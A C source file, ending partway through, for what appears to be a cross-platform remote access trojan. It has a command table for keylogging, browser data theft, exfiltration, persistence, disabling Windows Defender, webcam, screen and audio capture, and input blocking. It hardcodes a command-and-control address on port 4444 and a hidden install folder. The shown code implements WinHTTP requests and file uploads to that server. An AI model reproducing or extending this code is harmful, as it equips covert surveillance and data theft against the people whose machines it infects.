#ifdef _WIN32
    #define _CRT_SECURE_NO_WARNINGS
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <process.h>
    #include <shlwapi.h>
    #include <urlmon.h>
    #include <tlhelp32.h>
    #include <psapi.h>
    #include <signal.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "urlmon.lib")
    #pragma comment(lib, "shlwapi.lib")
    #pragma comment(lib, "psapi.lib")
    #define close_socket closesocket
    #define sleep(x) Sleep((x)*1000)
    #define usleep(x) Sleep((x)/1000)
    typedef SOCKET socket_t;
    typedef HANDLE thread_t;
    #define INVALID_FD INVALID_SOCKET
    // Windows-specific alternatives for Unix functions
    #define F_OK 0
    #define X_OK 0
    // Windows-compatible access function
    static inline int waccess(const char *path, int mode) {
        return PathFileExistsA(path) ? 0 : -1;
    }
    #define access waccess
#else
    #include <unistd.h>
    #include <fcntl.h>
    #include <sys/ioctl.h>
    #include <sys/mman.h>
    #include <linux/videodev2.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    #include <pthread.h>
    #include <signal.h>
    #include <errno.h>
    #include <sys/wait.h>
    #include <sys/stat.h>
    #include <libgen.h>
    #include <pwd.h>
    #include <limits.h>
    typedef int socket_t;
    typedef pthread_t thread_t;
    #define INVALID_FD -1
    #define close_socket close
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdbool.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/stat.h>
#include <stdarg.h>

// Platform-specific includes
#ifdef _WIN32
    #include <mmsystem.h>
    #include <iphlpapi.h>
    #include <wlanapi.h>
    #include <devpkey.h>
    #include <setupapi.h>
    #include <cfgmgr32.h>
    #include <powrprof.h>
    #include <ntddscsi.h>
    #include <winioctl.h>
    #include <shlobj.h>
    #include <hidclass.h>
    #include <winternl.h>
    #include <direct.h>
    #include <initguid.h>
    #include <usbiodef.h>
    #include <audioclient.h>
    #include <mmdeviceapi.h>
    #include <functiondiscoverykeys.h>
    #include <commctrl.h>
    #include <shobjidl.h>
    #include <wtsapi32.h>
    #include <highlevelmonitorconfigurationapi.h>
    #include <physicalmonitorenumerationapi.h>
    #include <endpointvolume.h>
    #include <mmdeviceapi.h>
    #include <functiondiscoverykeys_devpkey.h>
    #include <winhttp.h>
    #include <windows.h>
    #include <commctrl.h>
    #pragma comment(lib, "comctl32.lib")
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "wlanapi.lib")
    #pragma comment(lib, "setupapi.lib")
    #pragma comment(lib, "powrprof.lib")
    #pragma comment(lib, "winmm.lib")
    #pragma comment(lib, "ole32.lib")
    #pragma comment(lib, "comctl32.lib")
    #pragma comment(lib, "gdi32.lib")
    #pragma comment(lib, "user32.lib")
    #pragma comment(lib, "wtsapi32.lib")
    #pragma comment(lib, "dxva2.lib")
    #pragma comment(lib, "oleaut32.lib")
    #pragma comment(lib, "winhttp.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <ifaddrs.h>
    #include <pwd.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <sys/time.h>
    #include <dlfcn.h>
    #include <sys/io.h>
    #include <gtk/gtk.h>
    #include <linux/thermal.h>
    #include <linux/input.h>
    #include <linux/uinput.h>
    #include <linux/hidraw.h>
    #include <netpacket/packet.h>
    #include <linux/wireless.h>
    
    #ifndef __APPLE__
        #include <X11/Xlib.h>
        #include <X11/Xutil.h>
        #include <X11/keysym.h>
        #include <X11/extensions/XTest.h>
        #include <X11/Xatom.h>
    #endif
    
    #ifdef __APPLE__
        #include <sys/sysctl.h>
    #endif
#endif

#ifdef _WIN32
    typedef HANDLE thread_t;
    #define PTHREAD_MUTEX_INITIALIZER {0}
    typedef CRITICAL_SECTION pthread_mutex_t;
    #define pthread_mutex_lock(m) EnterCriticalSection(m)
    #define pthread_mutex_unlock(m) LeaveCriticalSection(m)
    #define pthread_create(t,a,f,arg) ((*t=(thread_t)_beginthreadex(NULL,0,(_beginthreadex_proc_type)(f),(arg),0,NULL))!=0?0:-1)
    #define pthread_join(t,r) WaitForSingleObject(t,INFINITE)
#else
    typedef pthread_t thread_t;
#endif

// Constants
#define MAX_COMMAND_LENGTH 256
#define MAX_OUTPUT_LENGTH 4096
#define MAX_PATH_LENGTH 1024
#define MAX_PROCESSES 512
#define MAX_NETWORK_CONNS 256
#define PORT_SCAN_LIMIT 1000
#define PATH_SEP "/"
#define TEMP_DIR "/tmp"
#define NULL_DEVICE "/dev/null"
#define BUFFER_SIZE 4096
#define CONNECTION_RETRY_INTERVAL 30  // seconds
#define SERVER_URL "EMPTY"

// Video streaming definitions
#define VIDEO_DEVICE "/dev/video0"
#define WIDTH 640
#define HEIGHT 480
#define VIDEO_PORT 5000
#define MAX_CLIENTS 5
#define FRAME_DELAY 33333 // approx 30fps in microseconds

// Tunnel definitions
#define CLOUDFLARED_LINUX_URL  "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
#define CLOUDFLARED_WINDOWS_URL "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"

#ifdef _WIN32
  #define HIDDEN_DIR "\\.local_tunnels_bin"
#else
  #define HIDDEN_DIR "/.local_tunnels_bin"
#endif

// Socket connection definitions
#define SOCKET_HOST "192.168.100.3"
#define SOCKET_PORT 4444
#define SOCKET_BUFFER_SIZE 8192

// Global variables
char current_dir[MAX_PATH_LENGTH];
int realtime_monitoring = 0;
int keylogger_active = 0;
int input_blocked = 0;
thread_t monitor_thread;
thread_t keylogger_thread;
int connected_to_server = 0;
char server_url[MAX_PATH_LENGTH] = SERVER_URL;
char output_dir[MAX_PATH_LENGTH] = "output";
int file_monitoring_active = 0;
thread_t file_monitor_thread;
int background_mode = 0;  // Flag for background operation
char client_id[256] = {0};

// Socket connection variables
socket_t server_socket_fd = INVALID_FD;
int use_socket_connection = 0;
char socket_host[MAX_PATH_LENGTH] = SOCKET_HOST;
int socket_port = SOCKET_PORT;

// GUI state
int gui_active = 0;
int optimization_running = 0;

// Video streaming globals
int video_fd = -1;
socket_t stream_server_fd = INVALID_FD;
volatile int running = 1;
volatile int streaming_active = 0;
thread_t stream_thread;

#ifdef _WIN32
WSADATA wsa_data;
HANDLE chrome_pid = NULL;
HANDLE monitor_pid = NULL;
#else
pid_t chrome_pid = 0;
pid_t monitor_pid = 0;
#endif

struct buffer {
    void *start;
    size_t length;
};

struct buffer *buffers = NULL;
int n_buffers = 0;

// Process information structure
typedef struct {
    int pid;
    char name[256];
    char user[256];
} ProcessInfo;

// Network connection structure
typedef struct {
    int pid;
    char local_addr[64];
    int local_port;
    char remote_addr[64];
    int remote_port;
    char state[32];
} NetworkConn;

// Command structure
typedef struct {
    char *name;
    void (*func)(char **);
    char *description;
} Command;

typedef struct {
    char *data;
    size_t size;
} http_response_t;

// Output capture helper for Windows and Linux
typedef struct {
    char *data;
    size_t size;
    size_t capacity;
} OutputBuffer;

// Global output buffer for capturing command output
static OutputBuffer *g_output_buffer = NULL;

// Macro to redirect printf calls
#define printf captured_printf

// Simple tunnel structure
typedef struct {
    int pid;
    char tool[16];   // "ngrok" or "cloudflared"
    char port[16];   // the port number
    char url[256];   // the URL, if available
} TunnelInfo;

// Function prototypes
void change_directory(char **args);
void list_directory(char **args);
void print_working_directory(char **args);
void create_note(char **args);
void show_help(char **args);
void vulnerability_scan(char **args);
void network_sniffer(char **args);
void keylogger(char **args);
void av_detection(char **args);
void firewall_check(char **args);
void startup_programs(char **args);
void running_processes(char **args);
void wifi_scanner(char **args);
void background_apps(char **args);
void webcam_access(char **args);
void take_screenshot(char **args);
void record_audio(char **args);
void block_input(char **args);
void terminate_process(char **args);
void extract_browser_data(char **args);
void exfiltrate_data(char **args);
void start_realtime_monitoring(char **args);
void show_monitoring_data(char **args);
void device_info(char **args);
void wallpaper_changer(char **args);
void enhanced_file_dump(char **args);
void exit_tool(char **args);
void clear_screen(char **args);
void wlan_control(char **args);
void fan_control(char **args);
void lan_intercept(char **args);
void unhook_defender(char **args);
void hardware_info(char **args);
void led_control(char **args);
void beeper_control(char **args);
void usb_dump(char **args);
void raw_socket(char **args);
void power_control(char **args);
void thermal_control(char **args);
void find_admin_processes(char **args);
void connect_to_server(char **args);
void disconnect_from_server(char **args);
void set_server_url(char **args);
void pull_file(char **args);
void send_file(char **args);
void execute_application(char **args);
void volume_control(char **args);
void brightness_control(char **args);
void ring_command(char **args);
void run_video_stream(char **args);
void run_geolocation(char **args);
void stop_stream(char **args);
void persist_command(char **args);
void process_tunnel_command(char **args);
void geo_signal_handler(int sig);
#ifdef _WIN32
unsigned __stdcall stream_video_background(void *arg);
#else
void stream_video_background();
#endif

// HTTP functions
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp);
http_response_t http_get(const char *url);
http_response_t http_post(const char *url, const char *data);
http_response_t http_post_file(const char *url, const char *filepath);
void free_http_response(http_response_t *response);

// Windows-specific HTTP functions using WinHTTP
#ifdef _WIN32
http_response_t http_get_winhttp(const char *url);
http_response_t http_post_winhttp(const char *url, const char *data);
http_response_t http_post_file_winhttp(const char *url, const char *filepath);
#endif

// Remote server functions
int connect_to_remote_server();
void send_to_server(const char *data);
void receive_from_server(char *buffer, int size);
void handle_remote_commands();
void send_buffer_to_server(const char *filename, const unsigned char *buffer, size_t size);
void send_screenshot_to_server();
void send_audio_to_server(int duration);
void maintain_server_connection();

// Socket connection functions
int socket_connect(const char *host, int port);
int socket_send(const char *data);
int socket_receive(char *buffer, int size);
void socket_send_file(const char *filename, const unsigned char *buffer, size_t size);
void socket_receive_file(const char *filepath);
void handle_remote_commands_socket();
int connect_to_remote_server_socket();

// Background operation functions
int has_console();
void install_persistence();
void run_in_background();

// Audio recording for Windows
#ifdef _WIN32
void record_audio_to_memory(unsigned char **buffer, size_t *size, int duration);
#endif

#ifdef _WIN32
unsigned __stdcall monitor_logs_thread_func(void* arg);
#endif
void monitor_logs();

// Tunnel functions
static void get_install_dir(char *buf, size_t len);
static bool ensure_dir_exists(const char *path);
static void make_executable_if_unix(const char *path);
static bool command_exists(const char *cmd);
static bool download_file(const char *url, const char *output);
static void install_cloudflared();
static bool is_process_running(const char *process_name);
static char* get_ngrok_url();
static bool kill_process(int pid);
static int get_tunnel_processes(TunnelInfo **tunnels);
static void start_tunnel(const char *tool, const char *port);
static void list_tunnels();
static void close_tunnel(int pid);
static void print_help();
static void process_tunnel_expose(int argc, char **argv);
static void process_tunnel_close(int argc, char **argv);

// Add these global variables for geolocation log capture
char geo_logs[4096] = "";
pthread_mutex_t geo_logs_mutex = PTHREAD_MUTEX_INITIALIZER;
char chrome_log_path[512] = "";

// Video streaming functions
static int send_all(socket_t fd, const void *buf, size_t len);
void cleanup_video();
int init_video(void);

#ifdef _WIN32
unsigned __stdcall monitor_logs_thread_func(void* arg);
unsigned __stdcall client_thread(void* arg);
#else
void* monitor_logs_thread(void* arg);
void* client_thread(void* arg);
#endif

// Geolocation functions
void cleanup_chrome_profile();
void create_chrome_preferences();
void create_test_page();

Command commands[] = {
    {"cd", change_directory, "Change directory"},
    {"ls", list_directory, "List directory contents"},
    {"pwd", print_working_directory, "Print working directory"},
    {"note", create_note, "Create a text note"},
    {"help", show_help, "Show help for commands"},
    {"scan", vulnerability_scan, "Vulnerability scanner"},
    {"sniff", network_sniffer, "Network sniffer"},
    {"keylog", keylogger, "Keylogger (start/stop)"},
    {"av", av_detection, "Detect anti-virus software"},
    {"firewall", firewall_check, "Check firewall status"},
    {"startup", startup_programs, "List startup programs"},
    {"ps", running_processes, "List running processes"},
    {"wifi", wifi_scanner, "Scan WiFi networks"},
    {"bgapps", background_apps, "List background applications"},
    {"webcam", webcam_access, "Capture image from webcam"},
    {"screenshot", take_screenshot, "Take screenshot"},
    {"record", record_audio, "Record audio (10 sec)"},
    {"block", block_input, "Block input (on/off)"},
    {"kill", terminate_process, "Terminate process"},
    {"browser", extract_browser_data, "Extract browser data"},
    {"exfil", exfiltrate_data, "Exfiltrate data (http/ftp target [data])"},
    {"monitor", start_realtime_monitoring, "Start real-time monitoring"},
    {"show", show_monitoring_data, "Show monitoring data"},
    {"persist", persist_command, "Install persistence mechanisms"},
    {"device", device_info, "Show detailed device information"},
    {"wallpaper", wallpaper_changer, "Change desktop wallpaper"},
    {"dump", enhanced_file_dump, "Enhanced file dump"},
    {"clear", clear_screen, "Clear screen"},
    {"exit", exit_tool, "Exit the tool"},
    {"wlan", wlan_control, "Wireless network manipulation"},
    {"fanctl", fan_control, "Control system fans"},
    {"lanintercept", lan_intercept, "LAN traffic interception"},
    {"unhookdefender", unhook_defender, "Unhook Windows Defender and add exception"},
    {"hwinfo", hardware_info, "Detailed hardware information"},
    {"ledctl", led_control, "Control system LEDs"},
    {"beeper", beeper_control, "Control system speaker"},
    {"usbdump", usb_dump, "USB traffic monitoring"},
    {"rawsock", raw_socket, "Raw socket operations"},
    {"power", power_control, "Power management control"},
    {"execute", execute_application, "Execute an application (use -headless for no window)"},
    {"thermal", thermal_control, "Thermal management control"},
    {"adminprocs", find_admin_processes, "Find processes running as admin"},
    {"connect", connect_to_server, "Connect to remote server"},
    {"disconnect", disconnect_from_server, "Disconnect from remote server"},
    {"serverurl", set_server_url, "Set remote server URL"},
    {"pull", pull_file, "Pull a file from client to server"},
    {"send", send_file, "Send a file from server to client"},
    {"volume", volume_control, "Control system volume (0-100)"},
    {"brightness", brightness_control, "Control screen brightness (0-100)"},
    {"ring", ring_command, "Play audio file (ring <path/to/audio>)"},
    {"stream", run_video_stream, "Start video streaming server"},
    {"geolocation", run_geolocation, "Start geolocation tracker"},
    {"stop", stop_stream, "Stop video stream"},
    {"tunnel", process_tunnel_command, "Tunnel management (install, list, close, expose)"},
    {NULL, NULL, NULL}
};

OutputBuffer* create_output_buffer() {
    OutputBuffer *buf = (OutputBuffer *)malloc(sizeof(OutputBuffer));
    buf->capacity = 4096;
    buf->data = (char *)malloc(buf->capacity);
    buf->size = 0;
    buf->data[0] = '\0';
    return buf;
}

void append_to_buffer(OutputBuffer *buf, const char *str) {
    size_t len = strlen(str);
    while (buf->size + len + 1 > buf->capacity) {
        buf->capacity *= 2;
        buf->data = (char *)realloc(buf->data, buf->capacity);
    }
    memcpy(buf->data + buf->size, str, len);
    buf->size += len;
    buf->data[buf->size] = '\0';
}

void free_output_buffer(OutputBuffer *buf) {
    if (buf) {
        free(buf->data);
        free(buf);
    }
}

// Custom printf that captures output
int captured_printf(const char *format, ...) {
    char temp[4096];
    va_list args;
    va_start(args, format);
    int ret = vsnprintf(temp, sizeof(temp), format, args);
    va_end(args);
    
    if (g_output_buffer) {
        append_to_buffer(g_output_buffer, temp);
    }
    
    return ret;
}

// Windows-specific HTTP functions using WinHTTP
#ifdef _WIN32
http_response_t http_get_winhttp(const char *url) {
    http_response_t response;
    response.data = malloc(1);
    response.size = 0;
    response.data[0] = '\0';
    
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    
    // Initialize WinHTTP session
    hSession = WinHttpOpen(L"WinHTTP Program/1.0", 
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, 
                          WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        // Parse the URL
        URL_COMPONENTS urlComponents;
        wchar_t szHost[256];
        wchar_t szPath[1024];
        
        ZeroMemory(&urlComponents, sizeof(urlComponents));
        urlComponents.dwStructSize = sizeof(urlComponents);
        urlComponents.lpszHostName = szHost;
        urlComponents.dwHostNameLength = sizeof(szHost) / sizeof(szHost[0]);
        urlComponents.lpszUrlPath = szPath;
        urlComponents.dwUrlPathLength = sizeof(szPath) / sizeof(szPath[0]);
        
        wchar_t wszUrl[2048];
        MultiByteToWideChar(CP_ACP, 0, url, -1, wszUrl, sizeof(wszUrl) / sizeof(wszUrl[0]));
        
        if (WinHttpCrackUrl(wszUrl, 0, 0, &urlComponents)) {
            // Connect to the server
            hConnect = WinHttpConnect(hSession, urlComponents.lpszHostName, 
                                      urlComponents.nPort, 0);
            
            if (hConnect) {
                // Create an HTTP request
                hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComponents.lpszUrlPath, 
                                             NULL, WINHTTP_NO_REFERER, 
                                             WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                
                if (hRequest) {
                    // Add client ID header
                    wchar_t clientIdHeader[512];
                    char clientIdHeaderA[512];
                    snprintf(clientIdHeaderA, sizeof(clientIdHeaderA), "X-Client-ID: %s", client_id);
                    MultiByteToWideChar(CP_ACP, 0, clientIdHeaderA, -1, clientIdHeader, 512);
                    WinHttpAddRequestHeaders(hRequest, clientIdHeader, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
                    
                    // Send the request
                    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                                         WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                        // Receive the response
                        DWORD dwSize = 0;
                        DWORD dwDownloaded = 0;
                        char *pszOutBuffer;
                        BOOL  bResults = FALSE;
                        
                        bResults = WinHttpReceiveResponse(hRequest, NULL);
                        
                        if (bResults) {
                            // Check how much data is available
                            dwSize = 0;
                            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                printf("Error %u in WinHttpQueryDataAvailable.\n", 
                                       GetLastError());
                            }
                            
                            while (dwSize > 0) {
                                // Allocate space for the buffer
                                pszOutBuffer = (char *)malloc(dwSize + 1);
                                if (!pszOutBuffer) {
                                    printf("Out of memory\n");
                                    break;
                                }
                                
                                // Read the data
                                ZeroMemory(pszOutBuffer, dwSize + 1);
                                
                                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, 
                                                   dwSize, &dwDownloaded)) {
                                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                                } else {
                                    // Reallocate response buffer to accommodate new data
                                    char *new_data = realloc(response.data, response.size + dwDownloaded + 1);
                                    if (new_data) {
                                        response.data = new_data;
                                        memcpy(response.data + response.size, pszOutBuffer, dwDownloaded);
                                        response.size += dwDownloaded;
                                        response.data[response.size] = '\0';
                                    } else {
                                        printf("Error reallocating memory\n");
                                    }
                                }
                                
                                // Free the memory allocated to the buffer
                                free(pszOutBuffer);
                                
                                // Check for more data
                                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                    printf("Error %u in WinHttpQueryDataAvailable.\n", 
                                           GetLastError());
                                    break;
                                }
                            }
                        }
                    }
                    
                    WinHttpCloseHandle(hRequest);
                }
                
                WinHttpCloseHandle(hConnect);
            }
        }
        
        WinHttpCloseHandle(hSession);
    }
    
    return response;
}

http_response_t http_post_winhttp(const char *url, const char *data) {
    http_response_t response;
    response.data = malloc(1);
    response.size = 0;
    response.data[0] = '\0';
    
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    
    // Initialize WinHTTP session
    hSession = WinHttpOpen(L"WinHTTP Program/1.0", 
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, 
                          WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        // Parse the URL
        URL_COMPONENTS urlComponents;
        wchar_t szHost[256];
        wchar_t szPath[1024];
        
        ZeroMemory(&urlComponents, sizeof(urlComponents));
        urlComponents.dwStructSize = sizeof(urlComponents);
        urlComponents.lpszHostName = szHost;
        urlComponents.dwHostNameLength = sizeof(szHost) / sizeof(szHost[0]);
        urlComponents.lpszUrlPath = szPath;
        urlComponents.dwUrlPathLength = sizeof(szPath) / sizeof(szPath[0]);
        
        wchar_t wszUrl[2048];
        MultiByteToWideChar(CP_ACP, 0, url, -1, wszUrl, sizeof(wszUrl) / sizeof(wszUrl[0]));
        
        if (WinHttpCrackUrl(wszUrl, 0, 0, &urlComponents)) {
            // Connect to the server
            hConnect = WinHttpConnect(hSession, urlComponents.lpszHostName, 
                                      urlComponents.nPort, 0);
            
            if (hConnect) {
                // Create an HTTP request
                hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComponents.lpszUrlPath, 
                                             NULL, WINHTTP_NO_REFERER, 
                                             WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                
                if (hRequest) {
                    // Add client ID header
                    wchar_t clientIdHeader[512];
                    char clientIdHeaderA[512];
                    snprintf(clientIdHeaderA, sizeof(clientIdHeaderA), "X-Client-ID: %s", client_id);
                    MultiByteToWideChar(CP_ACP, 0, clientIdHeaderA, -1, clientIdHeader, 512);
                    WinHttpAddRequestHeaders(hRequest, clientIdHeader, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
                    
                    // Set the content type header
                    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/x-www-form-urlencoded", 
                                           (DWORD)-1L, WINHTTP_ADDREQ_FLAG_REPLACE);
                    
                    // Send the request with data
                    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                                         (LPVOID)data, (DWORD)strlen(data), 
                                         (DWORD)strlen(data), 0)) {
                        // Receive the response
                        DWORD dwSize = 0;
                        DWORD dwDownloaded = 0;
                        char *pszOutBuffer;
                        BOOL  bResults = FALSE;
                        
                        bResults = WinHttpReceiveResponse(hRequest, NULL);
                        
                        if (bResults) {
                            // Check how much data is available
                            dwSize = 0;
                            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                printf("Error %u in WinHttpQueryDataAvailable.\n", 
                                       GetLastError());
                            }
                            
                            while (dwSize > 0) {
                                // Allocate space for the buffer
                                pszOutBuffer = (char *)malloc(dwSize + 1);
                                if (!pszOutBuffer) {
                                    printf("Out of memory\n");
                                    break;
                                }
                                
                                // Read the data
                                ZeroMemory(pszOutBuffer, dwSize + 1);
                                
                                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, 
                                                   dwSize, &dwDownloaded)) {
                                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                                } else {
                                    // Reallocate response buffer to accommodate new data
                                    char *new_data = realloc(response.data, response.size + dwDownloaded + 1);
                                    if (new_data) {
                                        response.data = new_data;
                                        memcpy(response.data + response.size, pszOutBuffer, dwDownloaded);
                                        response.size += dwDownloaded;
                                        response.data[response.size] = '\0';
                                    } else {
                                        printf("Error reallocating memory\n");
                                    }
                                }
                                
                                // Free the memory allocated to the buffer
                                free(pszOutBuffer);
                                
                                // Check for more data
                                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                    printf("Error %u in WinHttpQueryDataAvailable.\n", 
                                           GetLastError());
                                    break;
                                }
                            }
                        }
                    }
                    
                    WinHttpCloseHandle(hRequest);
                }
                
                WinHttpCloseHandle(hConnect);
            }
        }
        
        WinHttpCloseHandle(hSession);
    }
    
    return response;
}

http_response_t http_post_file_winhttp(const char *url, const char *filepath) {
    http_response_t response;
    response.data = malloc(1);
    response.size = 0;
    response.data[0] = '\0';
    
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    
    // Initialize WinHTTP session
    hSession = WinHttpOpen(L"WinHTTP Program/1.0", 
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, 
                          WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        // Parse the URL
        URL_COMPONENTS urlComponents;
        wchar_t szHost[256];
        wchar_t szPath[1024];
        
        ZeroMemory(&urlComponents, sizeof(urlComponents));
        urlComponents.dwStructSize = sizeof(urlComponents);
        urlComponents.lpszHostName = szHost;
        urlComponents.dwHostNameLength = sizeof(szHost) / sizeof(szHost[0]);
        urlComponents.lpszUrlPath = szPath;
        urlComponents.dwUrlPathLength = sizeof(szPath) / sizeof(szPath[0]);
        
        wchar_t wszUrl[2048];
        MultiByteToWideChar(CP_ACP, 0, url, -1, wszUrl, sizeof(wszUrl) / sizeof(wszUrl[0]));
        
        if (WinHttpCrackUrl(wszUrl, 0, 0, &urlComponents)) {
            // Connect to the server
            hConnect = WinHttpConnect(hSession, urlComponents.lpszHostName, 
                                      urlComponents.nPort, 0);
            
            if (hConnect) {
                // Create an HTTP request
                hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComponents.lpszUrlPath, 
                                             NULL, WINHTTP_NO_REFERER, 
                                             WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                
                if (hRequest) {
                    // Create a boundary string for multipart/form-data
                    const char *boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
                    
                    // Add client ID header FIRST
                    wchar_t clientIdHeader[512];
                    char clientIdHeaderA[512];
                    snprintf(clientIdHeaderA, sizeof(clientIdHeaderA), "X-Client-ID: %s", client_id);
                    MultiByteToWideChar(CP_ACP, 0, clientIdHeaderA, -1, clientIdHeader, 512);
                    WinHttpAddRequestHeaders(hRequest, clientIdHeader, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
                    
                    // Set the content type header with boundary (use ADD not REPLACE)
                    char contentTypeA[512];
                    snprintf(contentTypeA, sizeof(contentTypeA), 
                            "Content-Type: multipart/form-data; boundary=%s", boundary);
                    wchar_t contentType[512];
                    MultiByteToWideChar(CP_ACP, 0, contentTypeA, -1, contentType, 512);
                    
                    WinHttpAddRequestHeaders(hRequest, contentType, 
                                           (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
                    
                    // Read the file into memory
                    FILE *file = fopen(filepath, "rb");
                    if (file) {
                        fseek(file, 0, SEEK_END);
                        long fileSize = ftell(file);
                        fseek(file, 0, SEEK_SET);
                        
                        char *fileData = (char *)malloc(fileSize);
                        if (fileData) {
                            size_t bytes_read = fread(fileData, 1, fileSize, file);
                            fclose(file);
                            
                            if (bytes_read == fileSize) {
                                // Get the filename from the path
                                char filename[MAX_PATH_LENGTH];
                                char *lastSlash = strrchr(filepath, '\\');
                                if (!lastSlash) lastSlash = strrchr(filepath, '/');
                                if (lastSlash) {
                                    strcpy(filename, lastSlash + 1);
                                } else {
                                    strcpy(filename, filepath);
                                }
                                
                                // Build multipart header
                                char tempHeader[1024];
                                snprintf(tempHeader, sizeof(tempHeader), 
                                        "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", 
                                        boundary, filename);
                                
                                // Build multipart footer
                                char tempFooter[256];
                                snprintf(tempFooter, sizeof(tempFooter), "\r\n--%s--\r\n", boundary);
                                
                                // Calculate total size
                                int totalSize = strlen(tempHeader) + fileSize + strlen(tempFooter);
                                
                                // Allocate memory for the request data
                                char *requestData = (char *)malloc(totalSize);
                                if (requestData) {
                                    // Build the request data
                                    int pos = 0;
                                    
                                    // Add header
                                    memcpy(requestData + pos, tempHeader, strlen(tempHeader));
                                    pos += strlen(tempHeader);
                                    
                                    // Add file data
                                    memcpy(requestData + pos, fileData, fileSize);
                                    pos += fileSize;
                                    
                                    // Add footer
                                    memcpy(requestData + pos, tempFooter, strlen(tempFooter));
                                    pos += strlen(tempFooter);
                                    
                                    printf("DEBUG: Sending %d bytes to server\n", pos);
                                    
                                    // Send the request
                                    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                                                         (LPVOID)requestData, (DWORD)pos, 
                                                         (DWORD)pos, 0)) {
                                        // Receive the response
                                        DWORD dwSize = 0;
                                        DWORD dwDownloaded = 0;
                                        char *pszOutBuffer;
                                        BOOL  bResults = FALSE;
                                        
                                        bResults = WinHttpReceiveResponse(hRequest, NULL);
                                        
                                        if (bResults) {
                                            printf("DEBUG: Response received\n");
                                            
                                            // Check how much data is available
                                            dwSize = 0;
                                            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                                printf("Error %u in WinHttpQueryDataAvailable.\n", 
                                                       GetLastError());
                                            }
                                            
                                            while (dwSize > 0) {
                                                // Allocate space for the buffer
                                                pszOutBuffer = (char *)malloc(dwSize + 1);
                                                if (!pszOutBuffer) {
                                                    printf("Out of memory\n");
                                                    break;
                                                }
                                                
                                                // Read the data
                                                ZeroMemory(pszOutBuffer, dwSize + 1);
                                                
                                                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, 
                                                                   dwSize, &dwDownloaded)) {
                                                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                                                } else {
                                                    // Reallocate response buffer to accommodate new data
                                                    char *new_data = realloc(response.data, response.size + dwDownloaded + 1);
                                                    if (new_data) {
                                                        response.data = new_data;
                                                        memcpy(response.data + response.size, pszOutBuffer, dwDownloaded);
                                                        response.size += dwDownloaded;
                                                        response.data[response.size] = '\0';
                                                    } else {
                                                        printf("Error reallocating memory\n");
                                                    }
                                                }
                                                
                                                // Free the memory allocated to the buffer
                                                free(pszOutBuffer);
                                                
                                                // Check for more data
                                                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                                    printf("Error %u in WinHttpQueryDataAvailable.\n", 
                                                           GetLastError());
                                                    break;
                                                }
                                            }
                                        } else {
                                            printf("DEBUG: Failed to receive response. Error: %u\n", GetLastError());
                                        }
                                    } else {
                                        printf("DEBUG: Failed to send request. Error: %u\n", GetLastError());
                                    }
                                    
                                    free(requestData);
                                }
                            }
                            
                            free(fileData);
                        } else {
                            fclose(file);
                        }
                    }
                    
                    WinHttpCloseHandle(hRequest);
                }
                
                WinHttpCloseHandle(hConnect);
            }
        }
        
        WinHttpCloseHandle(hSession);
    }
    
    return response;
}
#endif

// Cross-platform HTTP functions
#ifdef _WIN32
http_response_t http_get(const char *url) {
    return http_get_winhttp(url);
}

http_response_t http_post(const char *url, const char *data) {
    return http_post_winhttp(url, data);
}

